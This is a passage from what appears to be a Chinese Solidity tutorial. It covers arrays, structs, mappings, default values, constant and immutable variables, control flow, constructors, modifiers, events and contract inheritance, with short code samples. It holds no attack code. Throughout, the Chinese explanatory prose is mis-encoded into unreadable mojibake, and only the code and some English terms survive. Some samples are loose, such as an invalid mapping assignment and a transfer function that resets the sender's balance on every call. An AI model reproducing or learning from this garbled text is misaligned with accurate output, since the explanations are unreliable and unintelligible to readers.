æ•°ç»„çš„é•¿åº¦åœ¨åˆ›å»ºåæ˜¯å›ºå®šçš„ã€‚ push() : åŠ¨æ€æ•°ç»„ å’Œ bytes æ‹¥æœ‰ push() æˆå‘˜ï¼Œå¯ä»¥åœ¨æ•°ç»„æœ€åæ·»åŠ ä¸€ä¸ª 0 å…ƒç´ ã€‚ push(x) : åŠ¨æ€æ•°ç»„ å’Œ bytes æ‹¥æœ‰ push(x) æˆå‘˜ï¼Œå¯ä»¥åœ¨æ•°ç»„æœ€åæ·»åŠ ä¸€ä¸ª x å…ƒç´ ã€‚ pop() : åŠ¨æ€æ•°ç»„ å’Œ bytes æ‹¥æœ‰ pop() æˆå‘˜ï¼Œå¯ä»¥ç§»é™¤æ•°ç»„æœ€åä¸€ä¸ªå…ƒç´ ã€‚ # ç»“æ„ä½“ struct åˆ›å»ºä¸€ä¸ªç»“æ„ä½“ï¼š // ç»“æ„ä½“ struct Student&#123; uint256 id; uint256 score; &#125;åˆå§‹åŒ–ä¸€ä¸ªç»“æ„ä½“ï¼š Student student; // åˆå§‹ä¸€ä¸ª student ç»“æ„ä½“ ç»“æ„ä½“èµ‹å€¼çš„ä¸¤ç§æ–¹æ³•ï¼š æ–¹æ³• 1: åœ¨å‡½æ•°ä¸­åˆ›å»ºä¸€ä¸ª storage çš„ struct å¼•ç”¨ function initStudent1() external&#123; Student storage _student = student; // assign a copy of student _student.id = 11; _student.score = 100; &#125; æ–¹æ³• 2: ç›´æ¥å¼•ç”¨çŠ¶æ€å˜é‡çš„ struct function initStudent2() external&#123; student.id = 1; student.score = 80; &#125;# solidity ä¸­çš„å“ˆå¸Œè¡¨ï¼šæ˜ å°„ç±»å‹ (mapping) # æ˜ å°„ mapping åœ¨æ˜ å°„ä¸­ï¼Œäººä»¬å¯ä»¥é€šè¿‡é”®ï¼ˆ Key ï¼‰æ¥æŸ¥è¯¢å¯¹åº”çš„å€¼ï¼ˆ Value ï¼‰ï¼Œæ¯”å¦‚ï¼šé€šè¿‡ä¸€ä¸ªäººçš„ id æ¥æŸ¥è¯¢ä»–çš„é’±åŒ…åœ°å€ã€‚ å£°æ˜æ˜ å°„çš„æ ¼å¼ä¸º mapping(_KeyType =&gt; _ValueType) ï¼Œå…¶ä¸­ _KeyType å’Œ _ValueType åˆ†åˆ«æ˜¯ Key å’Œ Value çš„å˜é‡ç±»å‹ã€‚ä¾‹å­ï¼š mapping(uint => address) public idToAddress; //id æ˜ å°„åˆ°åœ°å€ mapping(address => address) public swapPair; // å¸å¯¹çš„æ˜ å°„ï¼Œåœ°å€åˆ°åœ°å€è¿™é‡Œç”¨ mapping(uint =&gt; address) public idToAddress æ¥è¯´æ˜ä¸€ä¸‹æ˜ å°„ç±»å‹ï¼Œä¾‹å¦‚æœ‰ä¸€ä¸ªç”¨æˆ·ä»–çš„ id å«åš oacia , å¹¶ä¸”ä»–çš„é’±åŒ…åœ°å€æ˜¯ 0xABCDEF , é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¦‚ä¸‹è¯­å¥ idToAddress[oacia]=0xABCDEF è¿™ç§æ–¹å¼ï¼Œæ¥å°†ç”¨æˆ· oacia ä¸ä»–çš„é’±åŒ…åœ°å€ 0xABCDEF è”ç³»èµ·æ¥ï¼Œä¸‹æ¬¡ç”¨æˆ· oacia å†æ¬¡ä½¿ç”¨è¿™ä¸€ä¸ªåˆçº¦æ—¶ï¼Œé€šè¿‡æ˜ å°„ idToAddress å¯ä»¥é©¬ä¸ŠçŸ¥é“è¿™ä¸ªç”¨æˆ·çš„é’±åŒ…åœ°å€ä¸º 0xABCDEF . # æ˜ å°„çš„è§„åˆ™ è§„åˆ™ 1ï¼šæ˜ å°„çš„ _KeyType åªèƒ½é€‰æ‹© solidity é»˜è®¤çš„ç±»å‹ï¼Œæ¯”å¦‚ uint ï¼Œ address ç­‰ï¼Œä¸èƒ½ç”¨è‡ªå®šä¹‰çš„ç»“æ„ä½“ã€‚è€Œ _ValueType å¯ä»¥ä½¿ç”¨è‡ªå®šä¹‰çš„ç±»å‹ã€‚ä¸‹é¢è¿™ä¸ªä¾‹å­ä¼šæŠ¥é”™ï¼Œå› ä¸º _KeyType ä½¿ç”¨äº†æˆ‘ä»¬è‡ªå®šä¹‰çš„ç»“æ„ä½“ï¼š // æˆ‘ä»¬å®šä¹‰ä¸€ä¸ªç»“æ„ä½“ Struct struct Student&#123; uint256 id; uint256 score; &#125; mapping(Student => uint) public testVar; è§„åˆ™ 2ï¼šæ˜ å°„çš„å­˜å‚¨ä½ç½®å¿…é¡»æ˜¯ storage ï¼Œå› æ­¤å¯ä»¥ç”¨äºåˆçº¦çš„çŠ¶æ€å˜é‡ï¼Œå‡½æ•°ä¸­çš„ storage å˜é‡ï¼Œå’Œ library å‡½æ•°çš„å‚æ•°ï¼ˆè§ä¾‹å­ï¼‰ã€‚ä¸èƒ½ç”¨äº public å‡½æ•°çš„å‚æ•°æˆ–è¿”å›ç»“æœä¸­ï¼Œå› ä¸º mapping è®°å½•çš„æ˜¯ä¸€ç§å…³ç³» (key - value pair)ã€‚ è§„åˆ™ 3ï¼šå¦‚æœæ˜ å°„å£°æ˜ä¸º public ï¼Œé‚£ä¹ˆ solidity ä¼šè‡ªåŠ¨ç»™ä½ åˆ›å»ºä¸€ä¸ª getter å‡½æ•°ï¼Œå¯ä»¥é€šè¿‡ Key æ¥æŸ¥è¯¢å¯¹åº”çš„ Value ã€‚ è§„åˆ™ 4ï¼šç»™æ˜ å°„æ–°å¢çš„é”®å€¼å¯¹çš„è¯­æ³•ä¸º _Var[_Key] = _Value ï¼Œå…¶ä¸­ _Var æ˜¯æ˜ å°„å˜é‡åï¼Œ _Key å’Œ _Value å¯¹åº”æ–°å¢çš„é”®å€¼å¯¹ã€‚ä¾‹å­ï¼š function writeMap (uint _Key, address _Value) public&#123; idToAddress[_Key] = _Value; &#125;# æ˜ å°„çš„åŸç† åŸç† 1: æ˜ å°„ä¸å‚¨å­˜ä»»ä½•é”®ï¼ˆ Key ï¼‰çš„èµ„è®¯ï¼Œä¹Ÿæ²¡æœ‰ length çš„èµ„è®¯ã€‚ åŸç† 2: æ˜ å°„ä½¿ç”¨ keccak256(key) å½“æˆ offset å­˜å– valueã€‚ åŸç† 3: å› ä¸º Ethereum ä¼šå®šä¹‰æ‰€æœ‰æœªä½¿ç”¨çš„ç©ºé—´ä¸º 0ï¼Œæ‰€ä»¥æœªèµ‹å€¼ï¼ˆ Value ï¼‰çš„é”®ï¼ˆ Key ï¼‰åˆå§‹å€¼éƒ½æ˜¯ 0ã€‚ # å˜é‡çš„åˆå§‹å€¼ å½“æˆ‘ä»¬åˆšå®šä¹‰ä¸€ä¸ªå˜é‡å¹¶ä¸”æ²¡æœ‰ç»™å˜é‡èµ‹å€¼æ—¶ï¼Œsolidity ä¼šé»˜è®¤ä¸ºæ–°å®šä¹‰çš„å˜é‡èµ‹åˆå€¼ï¼Œå…·ä½“å¦‚ä¸‹ # å€¼ç±»å‹åˆå§‹å€¼ boolean : false string : &quot;&quot; int : 0 uint : 0 enum : æšä¸¾ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´  address : 0x0000000000000000000000000000000000000000 (æˆ– address(0) ) function internal : ç©ºç™½æ–¹ç¨‹ external : ç©ºç™½æ–¹ç¨‹ # å¼•ç”¨ç±»å‹åˆå§‹å€¼ æ˜ å°„ mapping : æ‰€æœ‰å…ƒç´ éƒ½ä¸ºå…¶é»˜è®¤å€¼çš„ mapping ç»“æ„ä½“ struct : æ‰€æœ‰æˆå‘˜è®¾ä¸ºå…¶é»˜è®¤å€¼çš„ç»“æ„ä½“ æ•°ç»„ array åŠ¨æ€æ•°ç»„: [] é™æ€æ•°ç»„ï¼ˆå®šé•¿ï¼‰: æ‰€æœ‰æˆå‘˜è®¾ä¸ºå…¶é»˜è®¤å€¼çš„é™æ€æ•°ç»„ # delete æ“ä½œç¬¦ delete a ä¼šè®©å˜é‡ a çš„å€¼å˜ä¸ºåˆå§‹å€¼ã€‚ //delete æ“ä½œç¬¦ bool public _bool2 = true; function d() external &#123; delete _bool2; //delete ä¼šè®©_bool2 å˜ä¸ºé»˜è®¤å€¼ï¼Œfalse &#125;# solidity çš„å¸¸æ•° solidity ä¸­ä¸¤ä¸ªå…³é”®å­—ï¼Œ constant ï¼ˆå¸¸é‡ï¼‰å’Œ immutable ï¼ˆä¸å˜é‡ï¼‰éƒ½å¯ä»¥ç”¨æ¥è¡¨ç¤ºå¸¸æ•°ï¼ŒçŠ¶æ€å˜é‡å£°æ˜è¿™ä¸ªä¸¤ä¸ªå…³é”®å­—ä¹‹åï¼Œä¸èƒ½åœ¨åˆçº¦åæ›´æ”¹æ•°å€¼ï¼›å¹¶ä¸”è¿˜å¯ä»¥èŠ‚çœ gas . å¦å¤–ï¼Œåªæœ‰æ•°å€¼å˜é‡å¯ä»¥å£°æ˜ constant å’Œ immutable ï¼› string å’Œ bytes å¯ä»¥å£°æ˜ä¸º constant ï¼Œä½†ä¸èƒ½ä¸º immutable ã€‚ # constant constant å˜é‡å¿…é¡»åœ¨å£°æ˜çš„æ—¶å€™åˆå§‹åŒ–ï¼Œä¹‹åå†ä¹Ÿä¸èƒ½æ”¹å˜ã€‚å°è¯•æ”¹å˜çš„è¯ï¼Œç¼–è¯‘ä¸é€šè¿‡ã€‚ //constant å˜é‡å¿…é¡»åœ¨å£°æ˜çš„æ—¶å€™åˆå§‹åŒ–ï¼Œä¹‹åä¸èƒ½æ”¹å˜ uint256 constant CONSTANT_NUM = 10; string constant CONSTANT_STRING = \"0xAA\"; bytes constant CONSTANT_BYTES = \"WTF\"; address constant CONSTANT_ADDRESS = 0x0000000000000000000000000000000000000000;# immutable immutable å˜é‡å¯ä»¥åœ¨å£°æ˜æ—¶æˆ–æ„é€ å‡½æ•°ä¸­åˆå§‹åŒ–ï¼Œå› æ­¤æ›´åŠ çµæ´»ã€‚ //immutable å˜é‡å¯ä»¥åœ¨ constructor é‡Œåˆå§‹åŒ–ï¼Œä¹‹åä¸èƒ½æ”¹å˜ uint256 public immutable IMMUTABLE_NUM = 9999999999; address public immutable IMMUTABLE_ADDRESS; uint256 public immutable IMMUTABLE_BLOCK; uint256 public immutable IMMUTABLE_TEST;ä½ å¯ä»¥ä½¿ç”¨å…¨å±€å˜é‡ä¾‹å¦‚ address(this) ï¼Œ block.number ï¼Œæˆ–è€…è‡ªå®šä¹‰çš„å‡½æ•°ç»™ immutable å˜é‡åˆå§‹åŒ–ã€‚åœ¨ä¸‹é¢è¿™ä¸ªä¾‹å­ï¼Œæˆ‘ä»¬åˆ©ç”¨äº† test() å‡½æ•°ç»™ IMMUTABLE_TEST åˆå§‹åŒ–ä¸º 9 ï¼š // åˆ©ç”¨ constructor åˆå§‹åŒ– immutable å˜é‡ï¼Œå› æ­¤å¯ä»¥åˆ©ç”¨ constructor()&#123; IMMUTABLE_ADDRESS = address(this); IMMUTABLE_BLOCK = block.number; IMMUTABLE_TEST = test(); &#125; function test() public pure returns(uint256)&#123; uint256 what = 9; return(what); &#125;# solidity çš„æ§åˆ¶æµ ç®€å•çœ‹äº†çœ‹ï¼Œå®Œå…¨å¯ä»¥å°† solidity çš„æ§åˆ¶æµå’Œ c è¯­è¨€ç±»æ¯”ï¼Œå› ä¸ºé€»è¾‘åŸºæœ¬ä¸Šæ˜¯ä¸€æ ·çš„ if-else function ifElseTest(uint256 _number) public pure returns(bool)&#123; if(_number == 0)&#123; return(true); &#125;else&#123; return(false); &#125;&#125; forå¾ªç¯ function forLoopTest() public pure returns(uint256)&#123; uint sum = 0; for(uint i = 0; i &lt; 10; i++)&#123; sum += i; &#125; return(sum);&#125; whileå¾ªç¯ function whileTest() public pure returns(uint256)&#123; uint sum = 0; uint i = 0; while(i &lt; 10)&#123; sum += i; i++; &#125; return(sum);&#125; do-whileå¾ªç¯ function doWhileTest() public pure returns(uint256)&#123; uint sum = 0; uint i = 0; do&#123; sum += i; i++; &#125;while(i &lt; 10); return(sum);&#125; ä¸‰å…ƒè¿ç®—ç¬¦ ä¸‰å…ƒè¿ç®—ç¬¦æ˜¯ solidity ä¸­å”¯ä¸€ä¸€ä¸ªæ¥å—ä¸‰ä¸ªæ“ä½œæ•°çš„è¿ç®—ç¬¦ï¼Œè§„åˆ™ æ¡ä»¶? æ¡ä»¶ä¸ºçœŸçš„è¡¨è¾¾å¼:æ¡ä»¶ä¸ºå‡çš„è¡¨è¾¾å¼ ã€‚ æ­¤è¿ç®—ç¬¦ç»å¸¸ç”¨ä½œ if è¯­å¥çš„å¿«æ·æ–¹å¼ã€‚ // ä¸‰å…ƒè¿ç®—ç¬¦ ternary/conditional operatorfunction ternaryTest(uint256 x, uint256 y) public pure returns(uint256)&#123;// return the max of x and y return x >= y ? x: y;&#125;å¦å¤–è¿˜æœ‰ continue ï¼ˆç«‹å³è¿›å…¥ä¸‹ä¸€ä¸ªå¾ªç¯ï¼‰å’Œ break ï¼ˆè·³å‡ºå½“å‰å¾ªç¯ï¼‰å…³é”®å­—å¯ä»¥ä½¿ç”¨ã€‚ # solidity çš„æ„é€ å‡½æ•°ä¸ä¿®é¥°å™¨ # æ„é€ å‡½æ•° æ„é€ å‡½æ•°ï¼ˆ constructor ï¼‰æ˜¯ä¸€ç§ç‰¹æ®Šçš„å‡½æ•°ï¼Œæ¯ä¸ªåˆçº¦å¯ä»¥å®šä¹‰ä¸€ä¸ªï¼Œå¹¶åœ¨éƒ¨ç½²åˆçº¦çš„æ—¶å€™è‡ªåŠ¨è¿è¡Œä¸€æ¬¡ã€‚å®ƒå¯ä»¥ç”¨æ¥åˆå§‹åŒ–åˆçº¦çš„ä¸€äº›å‚æ•°ï¼Œä¾‹å¦‚åˆå§‹åŒ–åˆçº¦çš„ owner åœ°å€ï¼š address owner; // å®šä¹‰ owner å˜é‡ // æ„é€ å‡½æ•° constructor() &#123; owner = msg.sender; // åœ¨éƒ¨ç½²åˆçº¦çš„æ—¶å€™ï¼Œå°† owner è®¾ç½®ä¸ºéƒ¨ç½²è€…çš„åœ°å€ &#125;# ä¿®é¥°å™¨ ä¿®é¥°å™¨ï¼ˆ modifier ï¼‰æ˜¯ solidity ç‰¹æœ‰çš„è¯­æ³•ï¼Œç±»ä¼¼äºé¢å‘å¯¹è±¡ç¼–ç¨‹ä¸­çš„ decorator ï¼Œå£°æ˜å‡½æ•°æ‹¥æœ‰çš„ç‰¹æ€§ï¼Œå¹¶å‡å°‘ä»£ç å†—ä½™ã€‚å®ƒå°±åƒé’¢é“ä¾ çš„æ™ºèƒ½ç›”ç”²ï¼Œç©¿ä¸Šå®ƒçš„å‡½æ•°ä¼šå¸¦æœ‰æŸäº›ç‰¹å®šçš„è¡Œä¸ºã€‚ modifier çš„ä¸»è¦ä½¿ç”¨åœºæ™¯æ˜¯è¿è¡Œå‡½æ•°å‰çš„æ£€æŸ¥ï¼Œä¾‹å¦‚åœ°å€ï¼Œå˜é‡ï¼Œä½™é¢ç­‰ã€‚ æˆ‘ä»¬æ¥å®šä¹‰ä¸€ä¸ªå«åš onlyOwner çš„ modifierï¼š // å®šä¹‰ modifier modifier onlyOwner &#123; require(msg.sender == owner);// æ£€æŸ¥è°ƒç”¨è€…æ˜¯å¦ä¸º owner åœ°å€ _;// å¦‚æœæ˜¯çš„è¯ï¼Œç»§ç»­è¿è¡Œå‡½æ•°ä¸»ä½“ï¼›å¦åˆ™æŠ¥é”™å¹¶ revert äº¤æ˜“ &#125;ä»£æœ‰ onlyOwner ä¿®é¥°ç¬¦çš„å‡½æ•°åªèƒ½è¢« owner åœ°å€è°ƒç”¨ï¼Œæ¯”å¦‚ä¸‹é¢è¿™ä¸ªä¾‹å­ï¼š function changeOwner(address _newOwner) external onlyOwner&#123; owner = _newOwner;// åªæœ‰ owner åœ°å€è¿è¡Œè¿™ä¸ªå‡½æ•°ï¼Œå¹¶æ”¹å˜ owner &#125;æˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ª changeOwner å‡½æ•°ï¼Œè¿è¡Œä»–å¯ä»¥æ”¹å˜åˆçº¦çš„ owner ï¼Œä½†æ˜¯ç”±äº onlyOwner ä¿®é¥°ç¬¦çš„å­˜åœ¨ï¼Œåªæœ‰åŸå…ˆçš„ owner å¯ä»¥è°ƒç”¨ï¼Œåˆ«äººè°ƒç”¨å°±ä¼šæŠ¥é”™ã€‚è¿™ä¹Ÿæ˜¯æœ€å¸¸ç”¨çš„æ§åˆ¶æ™ºèƒ½åˆçº¦æƒé™çš„æ–¹æ³•ã€‚ # solidity çš„äº‹ä»¶ äº‹ä»¶æ˜¯ä½¿ç”¨ EVM æ—¥å¿—å†…ç½®åŠŸèƒ½çš„æ–¹ä¾¿å·¥å…·ï¼Œåœ¨ dapp çš„æ¥å£ä¸­ï¼Œå®ƒå¯ä»¥åè¿‡æ¥è°ƒç”¨ Javascript çš„ç›‘å¬ äº‹ä»¶çš„å›è°ƒã€‚ Solidity ä¸­çš„äº‹ä»¶ï¼ˆ event ï¼‰æ˜¯ EVM ä¸Šæ—¥å¿—çš„æŠ½è±¡ï¼Œå®ƒå…·æœ‰ä¸¤ä¸ªç‰¹ç‚¹ï¼š å“åº”ï¼šåº”ç”¨ç¨‹åºï¼ˆ [ether.js](https://learnblockchain.cn/docs/ethers.js/api-contract.html#id18) ï¼‰å¯ä»¥é€šè¿‡ RPC æ¥å£è®¢é˜…å’Œç›‘å¬è¿™äº›äº‹ä»¶ï¼Œå¹¶åœ¨å‰ç«¯åšå“åº”ã€‚ ç»æµï¼šäº‹ä»¶æ˜¯ EVM ä¸Šæ¯”è¾ƒç»æµçš„å­˜å‚¨æ•°æ®çš„æ–¹å¼ï¼Œæ¯ä¸ªå¤§æ¦‚æ¶ˆè€— 2,000 gas ï¼›ç›¸æ¯”ä¹‹ä¸‹ï¼Œé“¾ä¸Šå­˜å‚¨ä¸€ä¸ªæ–°å˜é‡è‡³å°‘éœ€è¦ 20,000 gas ã€‚ # è§„åˆ™ äº‹ä»¶çš„å£°æ˜ç”± event å…³é”®å­—å¼€å¤´ï¼Œç„¶åè·Ÿäº‹ä»¶åç§°ï¼Œæ‹¬å·é‡Œé¢å†™å¥½äº‹ä»¶éœ€è¦è®°å½•çš„å˜é‡ç±»å‹å’Œå˜é‡åã€‚ä»¥ ERC20 ä»£å¸åˆçº¦çš„ Transfer äº‹ä»¶ä¸ºä¾‹ï¼š event Transfer(address indexed from, address indexed to, uint256 value);æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œ Transfer äº‹ä»¶å…±è®°å½•äº† 3 ä¸ªå˜é‡ from ï¼Œ to å’Œ value ï¼Œåˆ†åˆ«å¯¹åº”ä»£å¸çš„è½¬è´¦åœ°å€ï¼Œæ¥æ”¶åœ°å€å’Œè½¬è´¦æ•°é‡ã€‚ åŒæ—¶ from å’Œ to å‰é¢å¸¦ç€ indexed å…³é”®å­—ï¼Œæ¯ä¸ª indexed æ ‡è®°çš„å˜é‡å¯ä»¥ç†è§£ä¸ºæ£€ç´¢äº‹ä»¶çš„ç´¢å¼• â€œé”®â€ï¼Œåœ¨ä»¥å¤ªåŠä¸Šå•ç‹¬ä½œä¸ºä¸€ä¸ª topic è¿›è¡Œå­˜å‚¨å’Œç´¢å¼•ï¼Œç¨‹åºå¯ä»¥è½»æ¾çš„ç­›é€‰å‡ºç‰¹å®šè½¬è´¦åœ°å€å’Œæ¥æ”¶åœ°å€çš„è½¬è´¦äº‹ä»¶ã€‚æ¯ä¸ªäº‹ä»¶æœ€å¤šæœ‰ 3 ä¸ªå¸¦ indexed çš„å˜é‡ã€‚æ¯ä¸ª indexed å˜é‡çš„å¤§å°ä¸ºå›ºå®šçš„ 256 æ¯”ç‰¹ã€‚äº‹ä»¶çš„å“ˆå¸Œä»¥åŠè¿™ä¸‰ä¸ªå¸¦ indexed çš„å˜é‡åœ¨ EVM æ—¥å¿—ä¸­é€šå¸¸è¢«å­˜å‚¨ä¸º topic ã€‚å…¶ä¸­ topic[0] æ˜¯æ­¤äº‹ä»¶çš„ keccak256 å“ˆå¸Œï¼Œ topic[1] åˆ° topic[3] å­˜å‚¨äº†å¸¦ indexed å˜é‡çš„ keccak256 å“ˆå¸Œã€‚ value ä¸å¸¦ indexed å…³é”®å­—ï¼Œä¼šå­˜å‚¨åœ¨äº‹ä»¶çš„ data éƒ¨åˆ†ä¸­ï¼Œå¯ä»¥ç†è§£ä¸ºäº‹ä»¶çš„ â€œå€¼â€ã€‚ data éƒ¨åˆ†çš„å˜é‡ä¸èƒ½è¢«ç›´æ¥æ£€ç´¢ï¼Œä½†å¯ä»¥å­˜å‚¨ä»»æ„å¤§å°çš„æ•°æ®ã€‚å› æ­¤ä¸€èˆ¬ data éƒ¨åˆ†å¯ä»¥ç”¨æ¥å­˜å‚¨å¤æ‚çš„æ•°æ®ç»“æ„ï¼Œä¾‹å¦‚æ•°ç»„å’Œå­—ç¬¦ä¸²ç­‰ç­‰ï¼Œå› ä¸ºè¿™äº›æ•°æ®è¶…è¿‡äº† 256 æ¯”ç‰¹ï¼Œå³ä½¿å­˜å‚¨åœ¨äº‹ä»¶çš„ topic éƒ¨åˆ†ä¸­ï¼Œä¹Ÿæ˜¯ä»¥å“ˆå¸Œçš„æ–¹å¼å­˜å‚¨ã€‚å¦å¤–ï¼Œ data éƒ¨åˆ†çš„å˜é‡åœ¨å­˜å‚¨ä¸Šæ¶ˆè€—çš„ gas ç›¸æ¯”äº topic æ›´å°‘ã€‚ æˆ‘ä»¬å¯ä»¥åœ¨å‡½æ•°é‡Œé‡Šæ”¾äº‹ä»¶ã€‚åœ¨ä¸‹é¢çš„ä¾‹å­ä¸­ï¼Œæ¯æ¬¡ç”¨ _transfer() å‡½æ•°è¿›è¡Œè½¬è´¦æ“ä½œçš„æ—¶å€™ï¼Œéƒ½ä¼šé‡Šæ”¾ Transfer äº‹ä»¶ï¼Œå¹¶è®°å½•ç›¸åº”çš„å˜é‡ã€‚ // å®šä¹‰_transfer å‡½æ•°ï¼Œæ‰§è¡Œè½¬è´¦é€»è¾‘ function _transfer( address from, address to, uint256 amount ) external &#123; _balances[from] = 10000000; // ç»™è½¬è´¦åœ°å€ä¸€äº›åˆå§‹ä»£å¸ _balances[from] -= amount; //from åœ°å€å‡å»è½¬è´¦æ•°é‡ _balances[to] += amount; //to åœ°å€åŠ ä¸Šè½¬è´¦æ•°é‡ // é‡Šæ”¾äº‹ä»¶ emit Transfer(from, to, amount); &#125;# solidity ä¸­çš„ç»§æ‰¿ # ç»§æ‰¿ ç»§æ‰¿æ˜¯é¢å‘å¯¹è±¡ç¼–ç¨‹å¾ˆé‡è¦çš„ç»„æˆéƒ¨åˆ†ï¼Œå¯ä»¥æ˜¾è‘—å‡å°‘é‡å¤ä»£ç ã€‚å¦‚æœæŠŠåˆçº¦çœ‹ä½œæ˜¯å¯¹è±¡çš„è¯ï¼Œ solidity ä¹Ÿæ˜¯é¢å‘å¯¹è±¡çš„ç¼–ç¨‹ï¼Œä¹Ÿæ”¯æŒç»§æ‰¿ã€‚ # è§„åˆ™ virtual : çˆ¶åˆçº¦ä¸­çš„å‡½æ•°ï¼Œå¦‚æœå¸Œæœ›å­åˆçº¦é‡å†™ï¼Œéœ€è¦åŠ ä¸Š virtual å…³é”®å­—ã€‚ override ï¼šå­åˆçº¦é‡å†™äº†çˆ¶åˆçº¦ä¸­çš„å‡½æ•°ï¼Œéœ€è¦åŠ ä¸Š override å…³é”®å­—ã€‚ # ç®€å•ç»§æ‰¿ æˆ‘ä»¬å…ˆå†™ä¸€ä¸ªç®€å•çš„çˆ·çˆ·åˆçº¦ Yeye ï¼Œé‡Œé¢åŒ…å« 1 ä¸ª Log äº‹ä»¶å’Œ 3 ä¸ª function : hip() , pop() , yeye() ï¼Œè¾“å‡ºéƒ½æ˜¯â€Yeyeâ€ã€‚ contract Yeye &#123; event Log(string msg);// å®šä¹‰ 3 ä¸ª function: hip (), pop (), man ()ï¼ŒLog å€¼ä¸º Yeyeã€‚ function hip() public virtual&#123; emit Log(\"Yeye\"); &#125; function pop() public virtual&#123; emit Log(\"Yeye\"); &#125; function yeye() public virtual &#123; emit Log(\"Yeye\"); &#125;&#125;æˆ‘ä»¬å†å®šä¹‰ä¸€ä¸ªçˆ¸çˆ¸åˆçº¦ Baba ï¼Œè®©ä»–ç»§æ‰¿ Yeye åˆçº¦ï¼Œè¯­æ³•å°±æ˜¯ contract Baba is Yeye ï¼Œéå¸¸ç›´è§‚ã€‚åœ¨ Baba åˆçº¦é‡Œï¼Œæˆ‘ä»¬é‡å†™ä¸€ä¸‹ hip() å’Œ pop() è¿™ä¸¤ä¸ªå‡½æ•°ï¼ŒåŠ ä¸Š override å…³é”®å­—ï¼Œå¹¶å°†ä»–ä»¬çš„è¾“å‡ºæ”¹ä¸º â€Babaâ€ ï¼›å¹¶ä¸”åŠ ä¸€ä¸ªæ–°çš„å‡½æ•° baba ï¼Œè¾“å‡ºä¹Ÿæ˜¯ â€Babaâ€ ã€‚ contract Baba is Yeye&#123;// ç»§æ‰¿ä¸¤ä¸ª function: hip () å’Œ pop ()ï¼Œè¾“å‡ºæ”¹ä¸º Babaã€‚ function hip() public virtual override&#123; emit Log(\"Baba\"); &#125; function pop() public virtual override&#123; emit Log(\"Baba\"); &#125; function baba() public virtual&#123; emit Log(\"Baba\"); &#125;&#125;æˆ‘ä»¬éƒ¨ç½²åˆçº¦ï¼Œå¯ä»¥çœ‹åˆ° Baba åˆçº¦é‡Œæœ‰ 4 ä¸ªå‡½æ•°ï¼Œå…¶ä¸­ hip() å’Œ pop() çš„è¾“å‡ºè¢«æˆåŠŸæ”¹å†™æˆ â€Babaâ€ ï¼Œè€Œç»§æ‰¿æ¥çš„ yeye() çš„è¾“å‡ºä»ç„¶æ˜¯ â€Yeyeâ€ ã€‚ # å¤šé‡ç»§æ‰¿ solidity çš„åˆçº¦å¯ä»¥ç»§æ‰¿å¤šä¸ªåˆçº¦ã€‚è§„åˆ™ï¼š ç»§æ‰¿æ—¶è¦æŒ‰è¾ˆåˆ†æœ€é«˜åˆ°æœ€ä½çš„é¡ºåºæ’ã€‚æ¯”å¦‚æˆ‘ä»¬å†™ä¸€ä¸ª Erzi åˆçº¦ï¼Œç»§æ‰¿ Yeye åˆçº¦å’Œ Baba åˆçº¦ï¼Œé‚£ä¹ˆå°±è¦å†™æˆ contract Erzi is Yeye, Baba ï¼Œè€Œä¸èƒ½å†™æˆ contract Erzi is Baba, Yeye ï¼Œä¸ç„¶å°±ä¼šæŠ¥é”™ã€‚ å¦‚æœæŸä¸€ä¸ªå‡½æ•°åœ¨å¤šä¸ªç»§æ‰¿çš„åˆçº¦é‡Œéƒ½å­˜åœ¨ï¼Œæ¯”å¦‚ä¾‹å­ä¸­çš„ hip() å’Œ pop() ï¼Œåœ¨å­åˆçº¦é‡Œå¿…é¡»é‡å†™ï¼Œä¸ç„¶ä¼šæŠ¥é”™ã€‚ é‡å†™åœ¨å¤šä¸ªçˆ¶åˆçº¦ä¸­éƒ½é‡åçš„å‡½æ•°æ—¶ï¼Œ override å…³é”®å­—åé¢è¦åŠ ä¸Šæ‰€æœ‰çˆ¶åˆçº¦åå­—ï¼Œä¾‹å¦‚ override(Yeye, Baba) ã€‚ ä¾‹å­ï¼š contract Erzi is Yeye, Baba&#123;// ç»§æ‰¿ä¸¤ä¸ª function: hip () å’Œ pop ()ï¼Œè¾“å‡ºå€¼ä¸º Erziã€‚ function hip() public virtual override(Yeye, Baba)&#123; emit Log(\"Erzi\"); &#125; function pop() public virtual override(Yeye, Baba) &#123; emit Log(\"Erzi\"); &#125;æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œ Erzi åˆçº¦é‡Œé¢é‡å†™äº† hip() å’Œ pop() ä¸¤ä¸ªå‡½æ•°ï¼Œå°†è¾“å‡ºæ”¹ä¸º â€Erziâ€ ï¼Œå¹¶ä¸”è¿˜åˆ†åˆ«ä» Yeye å’Œ Baba åˆçº¦ç»§æ‰¿äº† yeye() å’Œ baba() ä¸¤ä¸ªå‡½æ•°ã€‚ # ä¿®é¥°å™¨çš„ç»§æ‰¿ Solidity ä¸­çš„ä¿®é¥°å™¨ï¼ˆ Modifier ï¼‰åŒæ ·å¯ä»¥ç»§æ‰¿ï¼Œç”¨æ³•ä¸å‡½æ•°ç»§æ‰¿ç±»ä¼¼ï¼Œåœ¨ç›¸åº”çš„åœ°æ–¹åŠ  virtual å’Œ override å…³é”®å­—å³å¯ã€‚ contract Base1 &#123; modifier exactDividedBy2And3(uint _a) virtual &#123; require(_a % 2 == 0 &amp;&amp; _a % 3 == 0); _; &#125;&#125;contract Identifier is Base1 &#123;// è®¡ç®—ä¸€ä¸ªæ•°åˆ†åˆ«è¢« 2 é™¤å’Œè¢« 3 é™¤çš„å€¼ï¼Œä½†æ˜¯ä¼ å…¥çš„å‚æ•°å¿…é¡»æ˜¯ 2 å’Œ 3 çš„å€æ•° function getExactDividedBy2And3(uint _dividend) public exactDividedBy2And3(_dividend) pure returns(uint, uint) &#123; return getExactDividedBy2And3WithoutModifier(_dividend); &#125;// è®¡ç®—ä¸€ä¸ªæ•°åˆ†åˆ«è¢« 2 é™¤å’Œè¢« 3 é™¤çš„å€¼ function getExactDividedBy2And3WithoutModifier(uint _dividend) public pure returns(uint, uint)&#123; uint div2 = _dividend / 2; uint div3 = _dividend / 3; return (div2, div3); &#125;&#125;Identifier åˆçº¦å¯ä»¥ç›´æ¥åœ¨ä»£ç ä¸­ä½¿ç”¨çˆ¶åˆçº¦ä¸­çš„ exactDividedBy2And3 ä¿®é¥°å™¨ï¼Œä¹Ÿå¯ä»¥åˆ©ç”¨ override 